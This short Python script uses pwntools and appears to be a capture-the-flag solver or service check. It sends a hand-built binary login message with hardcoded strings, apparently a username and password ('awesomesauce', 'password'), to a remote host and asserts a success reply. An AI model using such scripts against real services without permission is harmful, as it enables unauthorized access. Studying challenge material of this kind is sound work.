from pwn import *

c = remote(args.HOST, int(args.PORT))

payload = '\x17'
for s in ('net3', 'awesomesauce', 'password'):
    payload += flat([len(s) + 1, s, 0], word_size=8)
payload = flat([len(payload), payload], word_size=16, endianness='be')

c.send(payload)

ret = c.recv()
assert ret == '\x00\x0b!successful'
